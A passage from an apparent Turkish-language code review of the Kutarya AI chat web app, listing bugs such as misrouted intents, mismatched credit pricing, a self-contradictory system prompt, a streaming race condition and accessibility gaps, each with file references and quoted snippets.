KutaryaChatUI dizini yoksa betik uyarı basıp process.exit(0) ile başarılı sayılıyor, build devam ediyor (package.json:13 zincirinde && ile bağlı). O durumda dist/dene hiç oluşmuyor; firebase.json'daki '/dene' rewrite'ının hedefi (/dene/index.html) yok, '**' catch-all devreye girip SPA'yı servis ediyor. SPA'nın 'pages' kümesinde 'dene' anahtarı bulunmadığı için normalizePageKey('dene','not-found') -> 'not-found' döndürüyor. Yani App.jsx'in anonim ziyaretçiyi zorla gönderdiği adres, sessizce 'Sayfa Bulunamadı' ekranına dönüşüyor ve hiçbir yerde uyarı çıkmıyor.

> dene-sayfasi-kopyala.mjs:24-27  if (!existsSync(kaynak)) { console.warn(`[dene] kaynak bulunamadi, atlaniyor: ${kaynak}`); process.exit(0); }
> App.jsx:34  const pages = new Set(['landing', 'home', 'pricing', ... ]);   // 'dene' YOK
> App.jsx:131  return normalizePageKey(path, 'not-found');
> App.jsx:294-296  if (!user && page === 'chat') { window.location.replace(KTY_US_DEMO_PATH); return; }

### Model ucu ayarı yarım bağlanmış: betik sabit boş dize basıyor, ortam değişkeni okunmuyor
`D:/Kutarya/KutaryaAIWeb/scripts/dene-sayfasi-kopyala.mjs`:39

Enjekte edilen yorum 'Model ucu: yayin ortaminda BURADAN ayarlanir' diyor, ama basılan satır window.KTY_US_API_BASE'i her zaman "" yapıyor; betik hiçbir process.env değerini okumuyor. public/dene ve dist/dene her build'de rmSync ile silinip yeniden üretildiği için üretilen dosyayı elle düzenlemek de kalıcı değil. Repoda KTY_US_API_BASE'i set eden başka hiçbir yer yok. Yani 'yayında buradan ayarlanır' mekanizması yazılmamış.

> dene-sayfasi-kopyala.mjs:41-44  '  <!-- Model ucu: yayin ortaminda BURADAN ayarlanir. ... -->\n' +
>   '  <script>window.KTY_US_API_BASE = window.KTY_US_API_BASE || "";</script>\n'
> dene-sayfasi-kopyala.mjs:32  rmSync(hedef, { recursive: true, force: true });
> grep -rn KTY_US_API_BASE (src, scripts, server, KutaryaChatUI) -> yalnız bu betik ve deneme.js:36,45

### Görsel yönlendirmesi tetiklenince hazır cevaplar (kendine zarar desteği dahil) yutuluyor, kullanıcı 'Görsel oluşturulamadı' görüyor
`D:/Kutarya/KutaryaAIWeb/server/index.js`:2611

directAnswer (selfHarmAnswer / brandIdentityAnswer / conversationShortcut) satır 2467-2471'de intent.taskType'tan bağımsız hesaplanıyor ve satır 2588'de result olarak kullanılıyor. Ancak hasOutput hesabı, taskType image_generation ise SADECE görsel ekine bakıyor: isImageGeneration ? hasImageAttachment : ... . Hazır cevapların hiçbirinde ek yok, dolayısıyla hasOutput=false oluyor ve satır 2637-2639 kullanıcıya gerçek cevap yerine 'Görsel oluşturulamadı. Lütfen tekrar dene.' (IMAGE_EMPTY_OUTPUT) döndürüyor. Otomatik yönlendirme yanlış-pozitifleri (1. bulgu) bu ihtimali gerçek hale getiriyor: görsel kalıbına takılan bir mesaj aynı anda kimlik/güç sorusu veya kendine zarar sinyali içeriyorsa, kullanıcı destek metnini değil 'Görsel oluşturulamadı' hatasını görüyor. Kredi düşmüyor ve görsel kotası satır 2632'de iade ediliyor — yani mali taraf doğru, kırılan şey kullanıcıya dönen cevap.

> // index.js:2467-2471
> const selfHarmAnswer = buildSelfHarmSupportAnswer(trimmedMessage);
> const directAnswer = selfHarmAnswer || translationShortcut || brandIdentityAnswer || conversationShortcut;
> // index.js:2588
> const result = directAnswer || await generateGeminiResponse({...});
> // index.js:2611-2617
> const hasOutput = result?.success !== false && (
>   isImageGeneration ? hasImageAttachment : ... );
> // index.js:2637-2639
> const finalText = hasOutput ? responseText : (isImageGeneration ? 'Görsel oluşturulamadı. Lütfen tekrar dene.' : ...);

### İki ayrı düşünme yapılandırıcısı var ve aynı 'low' iki farklı şey demek
`D:/Kutarya/KutaryaAIWeb/server/services/geminiService.js`:461

Aynı model-ailesi dallanmasını yapan iki fonksiyon var: modelConfig.js'teki paylaşılan `dusunmeAyari()` (agent, studio, promptService, asistanKisilik hepsi bunu kullanıyor) ve geminiService.js'e kopyalanan `buildThinkingGenConfig()`. Sohbet yolu paylaşılanı kullanmıyor. Sonuç çelişkili: Gemini 2.5 için `dusunmeAyari(model,'low')` → thinkingBudget 0 (düşünme KAPALI), buildThinkingGenConfig varsayılanı → 1024 (paylaşılan ölçekte 'high'). Gemini 3 için de env değişkenleri ayrı (KUTARYA_THINKING_LEVEL / KUTARYA_THINKING_BUDGET yalnız sohbette okunuyor). İleride biri güncellenip diğeri unutulursa sessizce ayrışır; şu an bile aynı kelime iki farklı bütçe demek.

> geminiService.js:463-468 `if (/gemini-3/i.test(id)) { const level = process.env.KUTARYA_THINKING_LEVEL || 'low'; ... } const budget = Number(process.env.KUTARYA_THINKING_BUDGET || 1024);` · modelConfig.js:216-220 `if (/gemini-3/i.test(...)) return { thinkingConfig: { thinkingLevel: seviye } }; const butce = { low: 0, medium: 256, high: 1024 }[seviye] ?? 0;`

### usageMetrics hesaplanıp her mesajla Firestore'a yazılıyor ama web arayüzünde hiçbir yer okumuyor
`D:/Kutarya/KutaryaAIWeb/server/services/geminiService.js`:737

extractProviderUsage `thoughtsTokens`'ı ayrı ayrı çıkarıyor ama createUsageMetrics ve index.js'teki normalizeUsageMetrics bu alanı taşımıyor — düşünme token'ı responseTokens'ın içine gömülüp kayboluyor. Daha önemlisi: usageMetrics zincirin tamamından geçip her asistan mesajıyla Firestore'a yazılıyor, fakat src/ altında onu OKUYAN tek bir bileşen yok (grep: yalnız ChatPage.jsx:755 yazma ve chatApi.js taşıma). Yani satır 727-730'daki "kullanıcı 200 token görüp 1200 token'ın parasını ödemesin, döküm toplamı tutsun" gerekçesi web'de karşılıksız — kullanıcıya gösterilen bir döküm yok. Ek tutarsızlık: metrics.creditsUsed `max(1, configuredCredits, ceil(total/100))` ile hesaplanırken gerçekte düşülen `finalCredits` calculateCredits sonucudur; ikisi aynı değer olmak zorunda değil.

> geminiService.js:734 `return { promptTokens, responseTokens, thoughtsTokens, totalTokens };` — thoughtsTokens çağıranda kullanılmıyor · 745-751 createUsageMetrics'te thoughtsTokens alanı yok · index.js:3670-3679 normalizeUsageMetrics dört alan döndürüyor · src/ genelinde `responseTokens` araması: 0 sonuç

### Sistem promptunun kendi içinde çelişki: aynı metin hem "modlardan bahsetme" hem "Image mode / Vision mode" diyor
`D:/Kutarya/KutaryaAIWeb/server/services/intentRouter.js`:215

buildSystemInstruction, core kuralında (satır 172) modelin 'mode' kelimesini kullanmasını yasaklıyor, sonra satır 232'de aynı stringe modeNotes'u ekliyor ve modeNotes içinde 'Image mode has two separate jobs' (iki kez) ile 'merely because Vision mode is selected' geçiyor. Model, yasaklanan kelimeyi kendi talimatında görüyor — sızdırma riski doğrudan bu metinden geliyor. Ayrıca 'Vision mode' artık hiç var olmayan bir mod adı (mod seçici kaldırıldı); image_analysis artık modla değil, ekli görselle tetikleniyor (satır 78-80), yani talimat gerçeğe de uymuyor.

> // satır 172 (core):
> 'Never mention internal modes... Never use the word "mode"/"mod"...'
> // satır 215-217 (modeNotes, aynı prompta ekleniyor):
> image_analysis: '... Never switch to image generation merely because Vision mode is selected ...'
> image_generation: 'Image mode has two separate jobs: prompt writing and real image generation. ...'
> image_prompt: 'Image mode has two separate jobs: ...'
> // satır 232: return `${base}\n${modeNotes[intent.taskType] || modeNotes.chat}...`

### IMAGE_PROMPT_PATTERNS 'komut' kelimesini yakalıyor — terminal/shell komutu isteyen mesajlar görsel prompt yazma talimatı alıyor
`D:/Kutarya/KutaryaAIWeb/server/services/intentRouter.js`:23

5. kalıp bir görsel öznesinden sonra CÜMLENİN HERHANGİ BİR YERİNDE 'prompt|komut|talimat' geçmesini yeterli sayıyor. Türkçede 'komut' = terminal/shell komutu demek. Kalıbı çalıştırdım: 'resimleri toplu yeniden adlandıran bir komut yaz', 'logo dosyalarını silen terminal komutunu ver', 'poster boyutlarını değiştiren ffmpeg komutu', 'görsel klasörünü zipleyen komut', 'ikon boyutlandırma talimatı lazım' — hepsi image_prompt'a düşüyor. Bu, modele 'Write a professional image-generation prompt as text' (satır 217) talimatını veriyor, yani kullanıcı istediği shell komutunu değil bir görsel prompt'u alıyor. Kredi düşük ama cevap tamamen konu dışı. Ayrıca 7. kalıp /sadece\s+prompt\s+(...)?/ grubu isteğe bağlı olduğu için pratikte '/sadece prompt /' demek — sondaki boşluk şartı yüzünden 'sadece prompt' (satır sonu) eşleşmiyor, 'sadece prompt ver' eşleşiyor; kırılgan.

> // intentRouter.js:23
> /(?:logo|görsel|gorsel|resim|ikon|poster).*(prompt|komut|talimat)/i
> // Çalıştırıldı:
> // 'resimleri toplu yeniden adlandıran bir komut yaz' -> image_prompt (pattern #4)
> // 'logo dosyalarını silen terminal komutunu ver'      -> image_prompt (pattern #4)
> // 'görsel klasörünü zipleyen komut'                   -> image_prompt (pattern #4)

### Düşünme özelliği için hiçbir test yok
`D:/Kutarya/KutaryaAIWeb/server/tests/sseAkis.test.js`:1

server/tests altında 35 test dosyası var; hiçbiri reasoning yolunu kapsamıyor. Özellikle test edilmemiş kritik davranışlar: (1) `reasoningText` SSE çerçevesinin readStreamResponse tarafından biriktirilmesi (readStreamResponse zaten "test icin disa aciliyor" notuyla export edilmiş ama reasoning için hiç çağrılmamış), (2) thinkingConfig 400 dönerse düşünmesiz yeniden deneme güvenlik ağı, (3) thoughtsTokenCount'un responseTokens'a eklenmesi ve kredi etkisi, (4) thought part'ların fullText'e sızmaması. Bu dört davranışın hepsi kod yorumlarında "bu bir kez kırıldı" diye anlatılıyor ama regresyon kilidi yok.

> `grep -rln "reasoning|thought|thinking" server/tests/` → yalnız agentAdaptors*.test.js, agentQuota.test.js, agentRunner.test.js (hepsi agent tarafı) · chatApi.js:308-310 `// Test icin disa aciliyor: SSE cozumleme ... export async function readStreamResponse` — sseAkis.test.js içinde `readStreamResponse` geçmiyor

### Düşünme paneli akış biter bitmez kendiliğinden kapanıyor, kullanıcı okurken kayboluyor
`D:/Kutarya/KutaryaAIWeb/src/components/MessageBubble.jsx`:410

`<details open={Boolean(message.isThinking || message.isTyping)}>` — akış/typing bitince prop true→false geçiyor ve React `open` niteliğini kaldırıyor, panel kullanıcının elinde kapanıyor. Tam da düşünmenin en okunabilir olduğu an (yanıt tamamlandığında) içerik gizleniyor. Ayrıca yazma animasyonu (isTyping) sırasında panel bir kez daha zorla açılıp sonra kapandığı için akış-sonu-yazma-sonu iki kademeli açılıp-kapanma yaşanıyor. Ek olarak `open` React'te onToggle ile kontrol edilmediği için kullanıcı eliyle açıp kapattığında DOM ile React'in bildiği durum ayrışıyor; sonraki render aynı prop değeriyle geldiğinde React düzeltme yapmıyor.

> MessageBubble.jsx:410 `<details className="reasoning-panel" open={Boolean(message.isThinking || message.isTyping)}>` · ChatPage.jsx:1229 `? { ...message, content: '', isThinking: false, isTyping: true }` · 1241 civarı animasyon sonunda isTyping:false

### İstemci ve sunucu sınıflandırıcıları elle iki kez yazılmış ve ayrışmış — kullanıcıya yanlış kredi fiyatı gösteriliyor
`D:/Kutarya/KutaryaAIWeb/src/pages/ChatPage.jsx`:1359

resolveClientTaskType, intentRouter'daki kalıpların elle kopyalanmış ikinci bir sürümü ve listeler birbirini tutmuyor. Sunucuda olup istemcide olmayan: 'icon', 'çıkartma', 'portresi'. İstemcide olup sunucuda olmayan: 'image', 'duvar kagid'. 32 örnekle karşılaştırdım, 6'sı ayrıştı. En kötü yön: 'icon çiz' ve 'çıkartma yap' istemcide chat sayılıyor (etiket 'Kredi başarılı çıktıdan sonra düşer' = ucuz), sunucuda image_generation olup 250 kredi düşüyor — kullanıcı gösterilenden farklı ücretlendiriliyor. Ters yönde 'bir image oluştur' istemcide 250 kredi gösteriyor ama sunucu sohbete yönlendiriyor. Ayrıca istemci stream kararını (satır 669) kendi tahminine göre veriyor, yani ayrışma akış davranışını da etkiliyor. Tek kaynak (shared/) olmadığı sürece bu ayrışma her düzenlemede geri gelir.

> // ChatPage.jsx:1359-1360 (istemci)
> const imgSubject = '(res[iı]?m|resm|...|ikon|...|sticker|duvar kağıd|duvar kagid|wallpaper)';
> // intentRouter.js:53 (sunucu) — farklı liste
> const IMG_SUBJECT = '(?:res[iı]?m|...|ikon|icon|...|wallpaper|sticker|çıkartma)';
> // Ölçüm:
> // 'icon çiz'          -> SRV=image_generation, CLI=chat   (250 kredi, uyarısız)
> // 'çıkartma yap'      -> SRV=image_generation, CLI=chat   (250 kredi, uyarısız)
> // 'bir image oluştur' -> SRV=chat, CLI=image_generation   (boşuna 250 uyarısı)

### Mod seçici kaldırıldı ama arayüz hâlâ kullanıcıya "Modu seç" diyor
`D:/Kutarya/KutaryaAIWeb/src/pages/ChatPage.jsx`:1019

Karşılama ekranının alt yazısı hâlâ kullanıcıdan olmayan bir seçiciyi kullanmasını istiyor. ChatComposer.jsx:88'deki yorum ('Mod seçici (Sohbet/Kod/Görsel/Dosya) kaldırıldı') bileşenin gerçekten kaldırıldığını doğruluyor, yani kullanıcı bu talimatı uygulayacak hiçbir kontrol bulamıyor. Aynı metin LandingPage.jsx:15'te de duruyor: 'Kod yaz, metin düzenle, çeviri yap, araştır. Modu seç, doğrudan yaz — her mod aynı sohbet ekranında.' ve LandingPage App.jsx:361'den hâlâ render ediliyor. WorkspaceEmptyState.jsx:8 de 'Kod modunda çalıştığın proje sohbetleri.' diyor. Üçü de artık var olmayan bir özelliği anlatıyor.

> // ChatPage.jsx:1019
> <p className="welcome-sub">Bugün ne üzerinde çalışalım? Modu seç, doğrudan yaz.</p>
> // LandingPage.jsx:15
> metin: 'Kod yaz, metin düzenle, çeviri yap, araştır. Modu seç, doğrudan yaz — her mod aynı sohbet ekranında.',
> // ChatComposer.jsx:88
> {/* Mod seçici (Sohbet/Kod/Görsel/Dosya) kaldırıldı — tek sade sohbet akışı. */}

### Ulaşılamaz video uyarısı: koşul asla doğru olamaz, metin kaldırılmış bir modu seçmeyi söylüyor
`D:/Kutarya/KutaryaAIWeb/src/pages/ChatPage.jsx`:544

selectedMode useState('chat') ile başlıyor (satır 99) ve mod seçici kaldırıldığı için başka bir değere hiç ayarlanmıyor — handleModeChange yalnızca satır 843'ten 'chat' ile çağrılıyor. Dolayısıyla selectedMode === 'image' koşulu asla sağlanmıyor ve bu dal ölü kod. Dahası, dal çalışsaydı kullanıcıya 2026-08-25'te tamamen kaldırılmış olan 'Video Çizdirme modunu seçmelisin' diyecekti — hem yapılamayacak bir şey öneriyor hem de mod dilini kullanıyor. Aynı ölü video izleri: satır 552-579 (video preflight), 636-651 (video durum mesajları), 1194 ve 1261 (video etiketleri) hâlâ duruyor.

> // ChatPage.jsx:99   const [selectedMode, setSelectedMode] = useState('chat');
> // ChatPage.jsx:544-546
> if (wantsVideoGenerationPrompt(content) && selectedMode === 'image' && !outgoingAttachments.some(isVideoAttachment)) {
>   setNotice('Video oluşturmak için Video Çizdirme modunu seçmelisin. Görsel modu yalnızca görsel üretim ve görsel analiz içindir.');
>   return;
> }

### Giriş yapmış kullanıcıya gösterilen tanıtım, /dene'de tutulamayan bir söz veriyor
`D:/Kutarya/KutaryaAIWeb/src/pages/ChatPage.jsx`:986

Tanıtım şeridi YALNIZ giriş yapmış kullanıcıya çiziliyor (ChatPage korumalı sayfa) ve 'tamamen ücretsiz, kredi harcamaz' diyor. Fakat /dene tamamen statik: oturumu hiç bilmiyor, kotayı sadece localStorage'dan sayıyor. Giriş yapmış Pro kullanıcı da 5 mesajda duvara toslayıp 'Sınırsız devam etmek için Kutarya'ya giriş yapabilirsin' + 'Giriş yap' düğmesini görüyor — zaten girmiş durumda. Üstüne bilgi penceresi 'Sınırsız kullanım için giriş yapman yeterli' diyor; oysa Kutarya Us hiçbir plan/model listesinde yok (shared/planConfig.js içinde 'kty-us' geçmiyor), yani giriş sonrası bu modelle devam etmenin bir yolu yok.

> ChatPage.jsx:986-993  <strong>Kutarya Us</strong>&apos;u denemek ister misin? ... tamamen ücretsiz, kredi harcamaz.
>   <a className="primary" href={KTY_US_DEMO_PATH} target="_blank" ...>Dene</a>
> deneme.js:31  const UCRETSIZ_HAK = 5;   // oturumdan bağımsız, sadece localStorage
> deneme.js:331-333  `Giriş yapmadan ${UCRETSIZ_HAK} mesaj deneyebilirsin. Sınırsız kullanım için giriş yapman yeterli`
> deneme.html:124-129  'Ücretsiz deneme mesajların bitti.' ... <a id="login-link" href="/auth">Giriş yap</a>
> grep 'kty-us' shared/planConfig.js -> eşleşme yok

### Metin başladıktan sonra gelen reasoning parçası yazılmış cevabı ekrandan siliyor
`D:/Kutarya/KutaryaAIWeb/src/pages/ChatPage.jsx`:688

chatApi her reasoningText çerçevesinde `isThinking: true` ile onChunk çağırıyor. ChatPage'de `shouldRevealChunk = Boolean(isThinking) || ...` olduğu için bu her seferinde mesajı `content: getThinkingLabel(...)`, `isThinking: true` durumuna GERİ atıyor. MessageBubble ise `message.isThinking && message.reasoning` iken cevap bloğu yerine `null` render ediyor. Yani araç kullanımı/çok turlu düşünme nedeniyle metinden SONRA bir thought part gelirse ekrandaki cevap kayboluyor. En kötü hâl: son parça thought ise, akış bitiş çerçevesi `shouldRevealChunk=false` ile erken dönüyor (689) ve `revealedStreamContent` true olduğu için 720'deki düzeltme bloğu da atlanıyor — mesaj Firestore yazımı bitene kadar "düşünüyor" hâlinde takılı kalıyor.

> chatApi.js:341 `onChunk({ text: textAccumulator, reasoning: reasoningAccumulator, isThinking: true, done: false });` · ChatPage.jsx:688 `const shouldRevealChunk = Boolean(isThinking) || (!done && receivedTextChunks > 1 && streamHasVisiblePace);` · 696-697 `content: isThinking ? getThinkingLabel(...) : normalizeAssistantText(...), isThinking: Boolean(isThinking),` · MessageBubble.jsx:426 `) : message.isThinking && message.reasoning ? null : assistant ? (`

### Reasoning yalnız kaydederken 8000'e kırpılıyor — akışta sınırsız, kayıttan sonra panel görünür şekilde kısalıyor
`D:/Kutarya/KutaryaAIWeb/src/pages/ChatPage.jsx`:749

Sunucuda reasoning için hiçbir uzunluk sınırı yok; chatApi reasoningAccumulator'ı sınırsız biriktirip her parçada tamamını arayüze veriyor. Kırpma SADECE Firestore'a yazarken yapılıyor. Sonuç: kullanıcı akış boyunca örneğin 20.000 karakterlik düşünmeyi görüyor, mesaj kaydedilip listeye geri konunca panel 8000'e düşüyor — içerik gözünün önünde kısalıyor. Ayrıca kırpma ham `slice(8000)` olduğu için metin bir kod bloğunun (```) ortasında kesilirse marked.parse kalan her şeyi kapanmamış kod bloğu olarak render eder. (Firestore 1 MB belge sınırı 8000 karakterle risk altında değil; asıl sorun tutarsızlık.) Karşılaştırma için agent tarafında sunucu kırpması var: agentService.js:144 `.slice(0, 1600)`.

> ChatPage.jsx:749 `...(result.reasoning ? { reasoning: String(result.reasoning).slice(0, 8000) } : {}),` · chatApi.js:340 `reasoningAccumulator += parsed.reasoningText;` (sınır yok) · index.js:2544 `res.write(... { reasoningText: chunk.reasoningText })` (sınır yok)

### Düşünme metninin dili hiçbir yerde zorlanmıyor — Türkçe arayüzde İngilizce düşünce riski
`D:/Kutarya/KutaryaAIWeb/src/pages/ChatPage.jsx`:1339

Uygulama yanıt dilini `preferTurkish` tercihi ve systemInstruction ile yönetiyor; ancak thought summary ayrı bir kanaldır ve system instruction'a uyacağı garanti değildir. Kod tarafında düşünme metni için ne bir dil yönergesi, ne bir sonradan işleme, ne de bir uyarı var — geldiği gibi "Düşünme" başlıklı Türkçe panelin içine basılıyor. Yani tamamen Türkçe bir arayüzde İngilizce düşünce metni görünmesi tesadüfe bağlı. En azından bir dil yönergesi ya da panelde "model iç notu, dili değişebilir" tarzı bir açıklama gerekiyor.

> ChatPage.jsx:1339 `preferTurkish: settings?.preferTurkish !== false,` (yalnız systemInstruction'a gider) · MessageBubble.jsx:413 `<span>Düşünme</span>` · geminiService.js:568 `yield { reasoningText: p.text };` — hiçbir dil işlemesi yok

### Tanıtım sayfasında ('/') ücretsiz denemeye hiçbir bağlantı yok — /dene yalnız /chat'i elle yazanlara açılıyor
`D:/Kutarya/KutaryaAIWeb/src/pages/LandingPage.jsx`:46

App.jsx'teki yorum '/dene'nin amacını 'giriş duvarı yerine BURAYA alınır: ürünü önce denesin, sonra istersen giriş yapsın' diye tanımlıyor. Ama anonim ziyaretçinin gördüğü tek sayfa olan LandingPage'in birincil CTA'sı doğrudan setPage('auth')'a gidiyor, ikincisi 'pricing'e. Navbar'da da anonim kullanıcı için sohbet/dene bağlantısı yok (Navbar.jsx:11 marka düğmesi user yoksa 'landing'e döner). /dene'ye ulaşmanın tek yolu adres çubuğuna /chat yazmak. Özellik yazıldı ama huniye bağlanmamış.

> LandingPage.jsx:46-53  <button className="primary" onClick={() => setPage('auth')}>Ücretsiz başla</button>
>   <button className="ghost" onClick={() => setPage('pricing')}>Planları gör</button>
> Navbar.jsx:11  onClick={() => goTo(user ? 'chat' : 'landing')}
> grep -rn "/dene" KutaryaAIWeb/src -> yalnız App.jsx:42,295 ve ChatPage.jsx:19,992

### Tanıtım şeridi kırmızı HATA rengiyle çiziliyor (CSS özgüllük yenilgisi)
`D:/Kutarya/KutaryaAIWeb/src/styles/global.css`:290

global.css:287-289'daki yorum '.chat-notice HATA stilindedir (kırmızı); tanıtım bildirimi hata gibi görünmesin diye nötrleştirilir' diyor, ama nötrleştirme .kty-us-promo (özgüllük 0,1,0) ile yapılmış. Dosyanın ilerisinde, satır 3110'da :root:root .chat-notice (özgüllük 0,3,0) aynı üç özelliği danger token'larına geri çeviriyor. Hem özgüllük hem sıra bakımından kazanan 3110. Sonuç: 'Kutarya Us'u denemek ister misin?' tanıtımı kullanıcıya kırmızı hata bandı olarak görünüyor — amaçlananın tam tersi.

> global.css:290  .kty-us-promo { border-color: var(--line); background: var(--surface-2, var(--surface)); color: var(--text); }
> global.css:3110 :root:root .chat-notice{ border-color: var(--danger); background: var(--danger-weak); color: var(--danger); }

### Panelin açılır-kapanır olduğunu gösteren hiçbir işaret yok; summary uygulamanın odak kuralları dışında
`D:/Kutarya/KutaryaAIWeb/src/styles/global.css`:854

`.reasoning-summary` hem `list-style: none` hem `::-webkit-details-marker { display: none }` ile varsayılan açılır üçgeni kaldırıyor ama yerine chevron/ok koymuyor. Geriye sadece bir beyin ikonu ve "Düşünme" yazısı kalıyor; kullanıcı bunun tıklanabilir/genişletilebilir olduğunu anlayamıyor (imleç değişimi tek ipucu, dokunmatik ekranda o da yok). Erişilebilirlik tarafında `summary` uygulamanın iki odak halkası kuralının da kapsamı dışında (`:where(a, button, input, textarea, select, [tabindex])` ve `input/textarea/select/button`), dolayısıyla klavye odağı uygulamanın geri kalanından farklı görünüyor. `aria-expanded`/açıklayıcı etiket de yok.

> global.css:854 `list-style: none;` · 860 `.reasoning-summary::-webkit-details-marker { display: none; }` · 3104 `:where(a, :root:root button, :root:root input, :root:root textarea, :root:root select, :root:root [tabindex]):focus-visible{` — summary listede yok · 2919 `input:focus-visible, textarea:focus-visible, select:focus-visible, button:focus-visible {`

### Erişilebilirlik: akan yanıt duyurulmuyor, girdi alanının erişilebilir adı yok
`D:/Kutarya/KutaryaChatUI/deneme.html`:83

#messages'ta aria-live/role="log" yok; ekran okuyucu kullanan ziyaretçi cevabın geldiğini ve bittiğini hiç öğrenemez (odak da taşınmıyor). Kalan hak sayacı da (#quota-label) sessizce değişiyor. Ayrıca textarea'nın ne label'ı ne aria-label'ı var — yalnız placeholder var; kota bitince element disabled yapıldığı için sekme sırasından tamamen düşüyor ve 'neden yazamıyorum' bilgisi (limit-notice) ile arasında programatik bağ yok.

> deneme.html:83  <div id="messages"></div>   // aria-live yok
> deneme.html:100-103  <textarea id="chat-input" rows="1" ... placeholder="Kutarya Us'a bir şey sorun…"></textarea>   // aria-label yok
> deneme.html:109  <span id="quota-label" class="truncate text-xs text-muted-foreground"></span>   // aria-live yok
> deneme.js:96-101  dom.input.disabled = bitti;

### Mobil: sabit pb-44 payı, değişken yükseklikli alt blok için yetmiyor
`D:/Kutarya/KutaryaChatUI/deneme.html`:81

Dar ekranda alt blok 'fixed bottom-2 left-2 right-2' ve içeriği büyüyebiliyor; sohbet alanı ise sabit pb-44 (11rem = 176px) pay bırakıyor. İki durumda kesin taşma var: (1) textarea büyüyünce — bundle.css'te --max-message-height en az 24rem (384px), yani forma tek başına 176px'in iki katından fazla yer gerekebiliyor; (2) kota bitip limit-notice açılınca form (~100px) + panel (~85px) + bottom-2 ≈ 193px > 176px. Her iki halde de son mesajın altı composer'ın altında kalıyor. bundle.css bu iş için --chat-form-height değişkenini kullanıyor ve ui.js:548 onu canlı güncelliyor, ama deneme.html bu değişkeni hiç kullanmayıp sabit sınıfa güveniyor.

> deneme.html:81  <div class="chat-screen flex grow flex-col px-4 pb-44 md:pb-4" role="main">
> deneme.html:86  <div class="pointer-events-none md:sticky fixed mt-auto ... bottom-2 right-2 left-2 md:bottom-4">
> bundle.css  --max-message-height:max(24rem,min(80dvh,calc(100dvh - var(--chat-form-area-height) - 12rem)))
> ui.js:548  document.documentElement.style.setProperty('--chat-form-height', `${h}px`);   // deneme.html'de kullanılmıyor

### /dene'de siteye/girişe dönüş yolu kota bitene kadar gizli
`D:/Kutarya/KutaryaChatUI/deneme.html`:123

Sayfa başlığında yalnız marka yazısı (bağlantı değil), bilgi düğmesi ve tema seçici var. 'Giriş yap' bağlantısı #limit-notice içinde ve o kutu kota bitene kadar 'hidden'. Yani /chat'ten buraya zorla yönlendirilen ziyaretçi ne kutarya.com'a dönebiliyor ne de kayıt olabiliyor — 5 mesajını harcamadan dönüşüm yolu yok. Marka yazısı da <a> değil <span>, tıklanamıyor.

> deneme.html:48  <span class="min-w-0 truncate text-sm font-semibold">Kutarya Us</span>   <!-- bağlantı değil -->
> deneme.html:123  <div id="limit-notice" class="... hidden ...">
> deneme.html:126  <a id="login-link" href="/auth" ...>Giriş yap</a>
> deneme.js:95  if (dom.limit) dom.limit.classList.toggle('hidden', !bitti);

### Model rozeti düğmesi (#model-badge) hiçbir şey yapmıyor
`D:/Kutarya/KutaryaChatUI/index.html`:194

Composer'daki model rozeti `<button type="button">`, `cursor-pointer`, `hover:bg-muted-foreground/20`, `focus-visible:ring-2` sınıflarıyla tıklanabilir görünüyor. app.js'te bu düğmeye yalnızca innerHTML yazılıyor (renderModelBadge), tıklama işleyicisi yok. Orijinalde model seçici açılıyor. Aynı şey mesaj içi rozetler için de geçerli: modelBadgeHtml da tıklanamaz bir <button> üretiyor (app.js:343).

> index.html:196 `class="inline-flex cursor-pointer items-center gap-1.5 rounded-sm bg-background ... focus-visible:ring-2 ..."` ; app.js:355-372 sadece `el.innerHTML = ...` — hiçbir addEventListener yok.

### Bağlam göstergesi role="button" + tabindex=0 ama hiçbir eylemi yok
`D:/Kutarya/KutaryaChatUI/index.html`:181

Öğe klavyeyle odaklanabiliyor ve ekran okuyucuya "button" olarak duyuruluyor, ama ne click ne keydown işleyicisi var; Enter/Space hiçbir şey yapmıyor. Tooltip yalnız aria-label'ı ("Context usage") gösteriyor, gerçek kullanım oranını (ör. "1240 / 2048") göstermiyor — halbuki setContextGauge oranı `data-ratio` ve `aria-valuenow` olarak yazıyor ama role="button" ile aria-valuenow geçersiz (progressbar/meter rolü gerekir).

> index.html:181-183 `<div role="button" tabindex="0" aria-label="Context usage" data-context-gauge-trigger="" ... class="flex h-5 w-5 cursor-default items-center justify-center">` ; ui.js:1265 `host.setAttribute('aria-valuenow', String(Math.round(r * 100)));`

### /dene istemcisinde HTML yanıtı yakalanmıyor — React tarafındaki korumanın eşi yok
`D:/Kutarya/KutaryaChatUI/js/api.js`:283

streamChat yalnız res.ok kontrol ediyor, content-type doğrulaması yok. API_BASE boş olduğu için istek aynı origine (kutarya.com/v1/chat/completions) gidiyor; firebase.json'daki '**' -> /index.html catch-all rewrite'ı bu yolu SPA'nın index.html'ine yönlendiriyor. 200 + text/html gelen bir yanıtta hiçbir 'data:' satırı bulunmadığından döngü sessizce bitiyor, content boş kalıyor, hata fırlatılmıyor: kullanıcı hiç toast görmeden BOŞ bir asistan balonu görüyor (ve yukarıdaki bulgu gereği bir hakkı da yanıyor). Aynı sınıf hata React istemcisinde açıkça ele alınmış — iki istemci aynı riski farklı ele alıyor (tutarsızlık).

> api.js:283  if (!res.ok) { ... throw new Error(`HTTP ${res.status} ...`); }   // content-type kontrolü YOK
> chatApi.js:237  if (contentType.includes('text/html')) {
>       const apiError = new Error('Yanıt alınamadı. API sunucusuna ulaşılamıyor ...');
>       apiError.code = 'NETWORK_UNAVAILABLE'; throw apiError; }
> firebase.json:36-39  { "source": "**", "destination": "/index.html" }
> deneme.js:168-172  const govde = m.content ? ... : (m.streaming && !reasoning ? nokta animasyonu : '');   // akış bitti + içerik boş => tamamen boş

### İki üretim aynı anda başlayabiliyor ve birbirinin sonucunu bozuyor
`D:/Kutarya/KutaryaChatUI/js/app.js`:1184

sendMessage ve regenerate `if (stream) return` ile korunuyor, ama saveEdit korunmuyor. Akış sürerken önceki bir kullanıcı mesajının Edit düğmesi hâlâ görünür (aksiyon çubuğu yalnız AKAN mesajda gizleniyor). Kaydedince ikinci runGeneration başlıyor ve global `stream` değişkenini eziyor; ilk isteğin controller'ı iptal edilmiyor. finishStream ise yakalanmış değil GLOBAL stream'i okuduğu için (const s = stream), önce biten isteğin metni yanlış mesaja yazılıyor ve stream=null yapılıyor; ikinci istek bittiğinde finishStream `if (!s) return` ile hemen çıkıyor, sonucu HİÇ kaydedilmiyor ve son render çalışmıyor.

> app.js:1184 `async function saveEdit(msgId, nextText) {` — içinde stream kontrolü yok; 1225 `if (assistant) await runGeneration(conv, assistant);`  |  app.js:1018-1020 `function finishStream(result, err) { const s = stream; if (!s) return;`  |  karşılaştırma: app.js:1076 `if (!value || stream) return;` ve 1101 `if (stream) return;`

